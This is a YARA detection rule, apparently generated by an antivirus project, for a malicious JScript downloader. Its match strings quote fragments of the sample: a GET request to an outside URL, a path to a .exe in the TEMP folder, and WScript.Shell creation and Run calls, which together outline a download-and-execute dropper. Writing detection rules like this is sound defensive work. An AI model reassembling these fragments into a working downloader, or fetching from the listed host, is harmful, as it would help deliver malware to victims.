rule sig_20160329_0087fdaed61307272c30cbfdcd40a0d3 {
  meta:
    description = "datamaliciousorder - file 20160329_0087fdaed61307272c30cbfdcd40a0d3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd1385e52fbcdd6fe8f0141dc18b37ba4a954e4e9c99b8d8ecb5202574de2132"

  strings:
    $s1  = "wH[u](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function h() {return Hg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SDXZnWByOWk.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[G0](jR() * 11); if (wH[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Hg = function vp() {return WScript[sn](\"WScript.Shell\");}(), O = 11;" fullword ascii
    $s5  = "function oZ(sh, E){VL = VL * 1; return sh - E;};" fullword ascii
    $s6  = "function z0(){return \"\" + IC;};" fullword ascii
    $s7  = "function V() {return ((yS == true) && (yS == aq)) ? 1 : VL;};" fullword ascii
    $s8  = "function l(t){Hg[\"Run\"](t, VL, VL);};" fullword ascii
    $s9  = " while (wP){" fullword ascii
    $s10 = "var d = new this[\"Date\"]();" fullword ascii
    $s11 = "return oZ(dg, Bz);" fullword ascii
    $s12 = "function jR(){return 22;};" fullword ascii
    $s13 = "function z()" fullword ascii
    $s14 = "function X(){return sn;};" fullword ascii
    $s15 = "function G(X0) {var Y = (1, 2, 3, 4, 5, X0); return Y;};" fullword ascii
    $s16 = "aq = true; " fullword ascii
    $s17 = "var yS = false;" fullword ascii
    $s18 = "yS = true; " fullword ascii
    $s19 = "var PO = false;" fullword ascii
    $s20 = "var aq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}